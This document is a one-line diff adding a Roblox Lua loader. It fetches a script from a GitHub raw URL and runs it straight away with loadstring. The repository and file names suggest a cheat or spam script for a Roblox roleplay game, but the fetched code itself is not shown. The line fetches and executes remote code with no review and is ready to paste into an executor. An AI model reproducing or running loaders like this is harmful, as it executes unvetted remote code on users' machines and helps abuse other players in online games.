@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/lifetogether-rp-families-spam5-jf8chr10o0v4sl.lua"))()
